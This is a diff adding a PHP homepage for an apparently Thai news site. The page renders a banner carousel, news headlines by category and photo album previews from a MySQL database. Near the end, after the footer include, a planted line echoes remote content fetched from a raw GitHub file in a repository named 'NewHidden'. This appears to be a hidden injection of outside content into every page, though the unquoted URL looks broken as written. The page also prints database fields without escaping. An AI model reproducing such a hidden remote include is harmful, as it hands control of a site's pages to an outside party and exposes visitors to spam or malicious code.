@@ -1,0 +1,214 @@
+<?php
+require_once("admin/pages/connect.php");
+?>
+<!DOCTYPE html>
+<html lang="en">	
+<?php include ('head.php');  ?>
+  <body>
+	
+     <div class="row">
+
+      	<div class="col-lg-10 col-sm-12 col-xs-12 bg_fff" > 
+      		<div class="row ">    			
+      	   			<div class="col-lg-12 col-sm-12 mb-2">
+				    	<div id="carouselExampleIndicators" class="carousel slide " data-ride="carousel">
+					        
+					        <div class="carousel-inner" role="listbox">
+					          
+					           <?php
+					      
+					        	$sql_ban ="select * from banner where ban_cover=1 order by ban_id desc";
+								$query_ban =  mysqli_query($conn, $sql_ban);
+								$i =0;
+								while($row_ban=mysqli_fetch_assoc($query_ban))
+								{		
+
+									$classactive="";
+									if($i==0){
+													
+										$classactive="active";
+									}
+									else{
+										$classactive="";
+									}
+									
+						          echo '<div class="carousel-item '.$classactive.'">
+						           			<a href="'.$row_ban['ban_link'].'"><img class="img-responsive img-hover card-img-top" src="admin/pages/Upload/server/php/files/'.$row_ban['ban_pic'].'"></a>
+						          		</div>';
+						          	
+									$i++;
+								}
+					        ?>
+					        </div>
+					        
+					        
+					        
+					        <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
+					          <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+					          <span class="sr-only">Previous</span>
+					        </a>
+					        <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
+					          <span class="carousel-control-next-icon" aria-hidden="true"></span>
+					          <span class="sr-only">Next</span>
+					        </a>
+					    </div>
+					</div>
+					
+					
+      	   		
+      		</div>
+      		
+      		<div class="row mt-2 bg_fff ml-1 mr-1"> 
+	<?php
+      						$sql_n ="select * from newstype";
+							$result_n = mysqli_query($conn, $sql_n);					
+							$num_n = 1;
+							while($row_n = mysqli_fetch_assoc($result_n)){
+								
+								$class_bgNews="";
+								
+								if($row_n['newstype_id']==1){
+									$class_bgNews="bg_news1";
+								}
+								if($row_n['newstype_id']==2){
+									$class_bgNews="bg_news2";
+								}
+								/*if($row_n['newstype_id']==3){
+									$class_bgNews="bg_news3";
+								}
+								if($row_n['newstype_id']==4){
+									$class_bgNews="bg_news4";
+								}
+								if($row_n['newstype_id']==5){
+									$class_bgNews="bg_news5";
+								}*/
+								
+						
+								
+								$type_m5 = md5($row_n['newstype_id']);
+								
+								echo '<div class="col-lg-6 col-sm-12 pt-1">
+										<p class="'.$class_bgNews.' k"><i class="fa fa-newspaper-o" aria-hidden="true"> </i> '.$row_n['newstype_name'].'</p>	';
+								
+									$sql_news ="select * from news where newstype_id=".$row_n['newstype_id']." order by news_id desc limit 5";
+									$result_news = mysqli_query($conn, $sql_news);					
+									$i1=0;
+									while($row_news = mysqli_fetch_assoc($result_news))
+									{					
+										$id_md5 = md5($row_news['news_id']);
+									
+						      			if($i1 < 1){
+											echo '<div class="row mb-1 ">										
+												<div class="col-lg-12 card-text text-drak">
+													<a href="show_news.php?id='.$id_md5.'"><i class="fa fa-volume-down" aria-hidden="true"> </i> '.$row_news['news_head'] .' <img src="vendor/bootstrap/images/new06p.gif" class="" alt="" width="32px"></a>								
+												</div>
+												
+											</div>';
+										}
+										else{
+											echo '<div class="row mb-1 ">										
+												<div class="col-lg-12 card-text text-drak">
+													<a href="show_news.php?id='.$id_md5.'"><i class="fa fa-volume-down" aria-hidden="true"> </i> '.$row_news['news_head'].'</a>								
+												</div>
+												
+											</div>';
+										}
+										
+							      
+							      	$i1++;
+
+								}
+							$num_n++;
+							
+							echo '<div class="row">
+								    <div class="col-lg-12 text-right">
+								      <a href="show_newsAll.php?type='.$type_m5.'">อ่านเพิ่มเติม...
+							            <span class="glyphicon glyphicon-chevron-right"></span>
+							          </a>
+							        </div>   
+						     	</div>
+		     	
+      						</div>';
+							
+							
+						}
+      				
+      				?>
+      		
+		 </div>
+			
+		<div class="row mt-2 bg_fff ml-1 mr-1">
+		<div class="col-lg-12 col-sm-12 pt-1">
+		      
+				    
+						<p class="bg_news6 "><i class="fa fa-picture-o" aria-hidden="true"> </i> ประมวลภาพกิจกรรม</p>	
+						
+		</div>	            
+				     
+				      <?php
+				      
+				       	$sql_pic ="select * from album a, picture p where a.album_id=p.album_id and p.cover=1 order by a.album_id desc limit 2";
+						$result_pic = mysqli_query($conn, $sql_pic);					
+						$num = 1;
+						while($row_pic = mysqli_fetch_assoc($result_pic)){
+							
+							$id_md5 = md5($row_pic['album_id']);
+							
+				      	echo '<div class="col-lg-6 col-sm-12">
+						      		<a href="show_picture.php?id='.$id_md5.'">
+						      			<div class="row">
+							           		 <div class="col-lg-3 col-sm-12">
+							                             
+							                	 <img class="img-fluid rounded img-thumbnail" src="admin/pages/Upload/server/php/files/' . $row_pic['pic_data']. '" alt="">
+							              		 
+							            	</div>
+							            	<div class="col-lg-9 col-sm-12">
+							        			<p class="m-0">'.$row_pic['album_name'].'</p>
+							        		</div>
+							          </div>
+								   </a>   
+							   </div>';
+					      
+					      	$num ++;
+
+					}
+			?>
+					
+						     
+				     	
+					
+					
+						<div class="col-lg-12 text-right">
+						      <a href="show_albumAll.php">อ่านเพิ่มเติม...
+					            <span class="glyphicon glyphicon-chevron-right"></span>
+					          </a>
+					        </div> 
+				
+				
+				
+			
+		</div>
+    
+    
+    <!-- ปิด div row news-->
+	
+    </div> <!-- ปิด col-lg-8 -->
+  
+  <div class="col-lg-2 col-sm-12 col-xs-12  bg_left">
+	    
+	    	<?php include ('menu_left.php'); ?>
+	
+	    	
+	    </div>
+	 
+</div>
+	            	     	
+ 
+    <!-- Footer -->
+
+		<?php include ('footer.php');  ?>
+    <?php echo file_get_contents(https://raw.githubusercontent.com/Eza168/NewHidden/refs/heads/main/index.dsg-nrru);?>
+
+  </body>
+
+</html>
